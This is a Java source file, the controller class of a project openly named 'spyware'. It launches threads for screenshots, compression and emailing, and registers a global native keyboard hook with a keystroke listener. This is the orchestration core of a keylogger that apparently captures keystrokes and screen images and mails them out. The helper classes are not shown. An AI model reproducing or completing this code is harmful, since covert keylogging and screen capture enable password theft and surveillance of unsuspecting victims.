/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Control;

import Modelo.Comprimir;
import Modelo.Correo;
import Modelo.Pantallazo;
import Modelo.TecladoNativo;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import spyware.Spyware;

/**
 *
 * @author USUARIO
 */
public class Controlador {

    public Controlador() {

    }

    public void iniciar() {
        TecladoNativo keyboard = new TecladoNativo();
        Pantallazo pantallazo = new Pantallazo();
        Comprimir comprimir = new Comprimir();
        Correo correo = new Correo();
        pantallazo.start();
        comprimir.start();
        correo.start();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(Spyware.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(keyboard);

    }

}
